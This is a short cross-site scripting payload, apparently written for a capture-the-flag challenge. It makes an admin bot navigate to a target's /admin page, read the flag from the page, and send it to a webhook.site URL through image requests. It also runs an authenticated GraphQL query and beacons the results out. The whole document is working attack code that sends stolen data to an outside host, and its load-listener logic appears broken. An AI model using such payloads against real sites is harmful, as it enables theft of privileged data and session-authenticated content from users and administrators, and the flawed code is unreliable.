<script>
  // Instead of fetching, make the bot NAVIGATE to admin page
  // Then we can read the content from the same-origin page
  
  // Step 1: Navigate to admin page
  window.location.href = 'http://94.237.61.52:42667/admin';
  
  // Step 2: After navigation, extract the flag
  // We need to wait for the page to load
  window.addEventListener('load', function() {
    // This code runs AFTER the bot navigates to the admin page
    const h4Element = document.querySelector('h4');
    const flag = h4Element ? h4Element.textContent : 'NO_H4_FOUND';
    
    // Send flag back to webhook
    new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?flag=' + encodeURIComponent(flag);
    
    // Also send the entire page HTML
    new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?html_len=' + document.documentElement.innerHTML.length;
    
    // Try to get more data via GraphQL (now on same origin)
    fetch('/graphql', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',
      body: JSON.stringify({
        query: `query { incidentReports { id title } }`
      })
    })
    .then(r => r.json())
    .then(data => {
      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?reports=' + data.data.incidentReports.length;
    });
  }, {once: true});
</script>
